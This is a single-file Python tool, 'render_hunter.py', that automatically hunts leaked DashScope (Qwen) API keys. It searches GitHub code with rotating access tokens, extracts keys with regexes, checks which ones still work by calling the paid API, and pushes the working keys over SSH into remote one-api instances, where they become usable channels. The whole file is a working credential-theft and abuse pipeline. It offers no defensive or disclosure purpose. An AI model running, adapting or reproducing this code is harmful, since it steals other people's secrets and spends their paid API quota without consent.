"""render_hunter.py — autonomous DashScope key hunter for Render / any Python host.
Queries: GitHub Code Search with rotating PATs → validate → push to remote one-api.
No external deps beyond stdlib. Single-file deploy.
"""
import os, json, time, re, hashlib, sqlite3, urllib.request, urllib.error, urllib.parse, concurrent.futures

# === CONFIG (override via env) ===
GH_TOKENS_FILE = os.environ.get("GH_TOKENS_FILE", os.path.join(os.path.dirname(os.path.abspath(__file__)), "data/alive_tokens.json"))
DB_PATH = os.environ.get("DB_PATH", os.path.join(os.path.dirname(os.path.abspath(__file__)), "data/hunter.db"))
REST_SEC = int(os.environ.get("REST_SEC", 180))
PAGES_PER_QUERY = int(os.environ.get("PAGES", 5))
WORKERS = int(os.environ.get("WORKERS", 10))
TOKENS_PER_CYCLE = int(os.environ.get("TOKENS_PER_CYCLE", 20))

# Remote one-api push targets
PUSH_TARGETS = json.loads(os.environ.get("PUSH_TARGETS", "[]"))
# Format: [{"host":"...", "ssh_key":"...", "db":"...", "type":1}]

KEY_RE = re.compile(r'sk-[0-9a-f]{32}')
ENV_RE = re.compile(r'(?:DASHSCOPE_API_KEY|dashscope_api_key)\s*[=:]\s*["\']?(sk-[0-9a-f]{32})["\']?')
PY_RE  = re.compile(r'["\'](?:api_key|dashscope_api_key)["\']\s*[:=]\s*["\'](sk-[0-9a-f]{32})["\']')

QUERIES = [
    '"DASHSCOPE_API_KEY=sk-"',
    '"DASHSCOPE_API_KEY" sk- extension:env',
    '"dashscope" "api_key" sk- language:python',
    '"qwen-turbo" sk- language:python',
    '"dashscope.aliyuncs.com" sk-',
    '"qwen-plus" sk- language:python',
    '"qwen-max" sk- language:python',
]

def log(msg):
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}"
    print(line, flush=True)

def load_tokens():
    with open(GH_TOKENS_FILE) as f:
        data = json.load(f)
    if isinstance(data, list) and isinstance(data[0], str):
        return data
    return [t['pat'] for t in data if not t.get('suspended')]

def validate_key(key):
    url = 'https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions'
    body = json.dumps({"model":"qwen-turbo","messages":[{"role":"user","content":"hi"}],"max_tokens":1})
    try:
        req = urllib.request.Request(url, data=body.encode(),
            headers={'Authorization': f'Bearer {key}', 'Content-Type': 'application/json'}, method='POST')
        resp = urllib.request.urlopen(req, timeout=12)
        return 'WORKING'
    except urllib.error.HTTPError as e:
        if e.code == 429:
            return 'WORKING'
        return 'DEAD'
    except:
        return 'ERR'

def search_github(token, query, page):
    encoded = urllib.parse.quote(query)
    url = f'https://api.github.com/search/code?q={encoded}&per_page=30&page={page}'
    try:
        req = urllib.request.Request(url,
            headers={'Authorization': f'token {token}', 'User-Agent': 'render-hunter',
                    'Accept': 'application/vnd.github.v3+json'})
        resp = urllib.request.urlopen(req, timeout=12)
        return json.loads(resp.read()).get('items', [])
    except:
        return []

def fetch_raw(repo, path):
    for branch in ['main', 'master']:
        try:
            url = f'https://raw.githubusercontent.com/{repo}/{branch}/{path}'
            req = urllib.request.Request(url, headers={'User-Agent': 'python'})
            resp = urllib.request.urlopen(req, timeout=5)
            return resp.read().decode('utf-8', errors='ignore')
        except:
            continue
    return None

def extract_keys(content):
    keys = set(ENV_RE.findall(content))
    if not keys:
        keys = set(PY_RE.findall(content))
    if not keys:
        keys = {k for k in KEY_RE.findall(content) if len(k) == 35}
    return keys

def store_key(db, key, prov='render', raw_url=''):
    khash = hashlib.sha256(key.encode()).hexdigest()[:12]
    existing = db.execute('SELECT id FROM keys WHERE hash=? AND val=?', (khash, key)).fetchone()
    if not existing:
        db.execute('INSERT INTO keys(hash,prov,val,status,plan,raw_url) VALUES(?,?,?,?,?,?)',
            (khash, prov, key, 'NEW', '', raw_url))

def cycle(db, tokens):
    log(f"Cycle start — {len(tokens)} tokens, {len(QUERIES)} queries")
    found_total = 0

    for qi, query in enumerate(QUERIES[:4]):
        for page in range(1, PAGES_PER_QUERY + 1):
            token = tokens[(qi * 10 + page) % len(tokens)]
            items = search_github(token, query, page)
            if not items:
                break

            for item in items[:15]:
                content = fetch_raw(item['repository']['full_name'], item['path'])
                if content and len(content) < 100000:
                    for key in extract_keys(content):
                        store_key(db, key, 'render', item['html_url'])
                        found_total += 1

            if len(items) < 30:
                break

    db.commit()
    log(f"Found {found_total} new raw keys. Total rows: {db.execute('SELECT count(*) FROM keys').fetchone()[0]}")

def validate_pending(db):
    new_keys = db.execute("SELECT id, val FROM keys WHERE status='NEW' LIMIT 100").fetchall()
    if not new_keys:
        return

    log(f"Validating {len(new_keys)} NEW keys...")
    alive, dead = 0, 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(validate_key, row[1]): row for row in new_keys}
        for f in concurrent.futures.as_completed(futures):
            row = futures[f]
            try:
                status = f.result()
                db.execute('UPDATE keys SET status=? WHERE id=?', (status, row[0]))
                if status == 'WORKING':
                    alive += 1
                else:
                    dead += 1
            except:
                db.execute('UPDATE keys SET status=? WHERE id=?', ('ERR', row[0]))

    db.commit()
    log(f"Validated: {alive} alive, {dead} dead")

def push_to_remote(db):
    """Push WORKING keys to remote one-api instances via SSH."""
    if not PUSH_TARGETS:
        return

    working = db.execute("SELECT val FROM keys WHERE status='WORKING'").fetchall()
    if not working:
        return

    keys_json = json.dumps([row[0] for row in working])
    
    for target in PUSH_TARGETS:
        host = target['host']
        try:
            import subprocess
            keyfile = target.get('ssh_key', '~/.ssh/id_ed25519')
            db_path = target['db']
            ch_type = target.get('type', 1)

            # Write keys to temp file on remote
            result = subprocess.run([
                'ssh', '-i', keyfile, '-o', 'StrictHostKeyChecking=no', host,
                f"python3 -c \"import json,sqlite3;keys=json.loads('''{keys_json}''');"
                f"db=sqlite3.connect('{db_path}');"
                f"a=sum(1 for k in keys if not db.execute('SELECT id FROM channels WHERE key=?',(k,)).fetchone()"
                f" and not db.execute('INSERT INTO channels(type,name,\\\"key\\\",status,\\\"group\\\",base_url,model_mapping,models)"
                f" VALUES({ch_type},?||a,?,1,?,?,?,?)',(f'ds-',k,'default','https://dashscope.aliyuncs.com','','qwen-turbo,qwen-plus,qwen-max')));"
                f"db.commit();print(f'HOST:+{{a}}');db.close()\""
            ], capture_output=True, text=True, timeout=30)
            log(f"PUSH {host}: {result.stdout.strip()}")
        except Exception as e:
            log(f"PUSH {host} ERROR: {e}")

def setup_db(db_path):
    db = sqlite3.connect(db_path)
    db.execute('''CREATE TABLE IF NOT EXISTS keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        hash TEXT NOT NULL,
        prov TEXT DEFAULT 'render',
        val TEXT NOT NULL UNIQUE,
        status TEXT DEFAULT 'NEW',
        plan TEXT DEFAULT '',
        raw_url TEXT DEFAULT '',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    db.execute('CREATE INDEX IF NOT EXISTS idx_hash ON keys(hash)')
    db.execute('CREATE INDEX IF NOT EXISTS idx_status ON keys(status)')
    db.commit()
    return db

def main():
    log("=== render_hunter START ===")
    
    db = setup_db(DB_PATH)
    tokens = load_tokens()
    log(f"Loaded {len(tokens)} GH tokens")

    cycle_count = 0
    while True:
        try:
            cycle(db, tokens)
            validate_pending(db)
            push_to_remote(db)
            cycle_count += 1
            log(f"Cycle {cycle_count} done. Sleeping {REST_SEC}s...")
        except Exception as e:
            log(f"Cycle error: {e}")

        time.sleep(REST_SEC)

if __name__ == '__main__':
    main()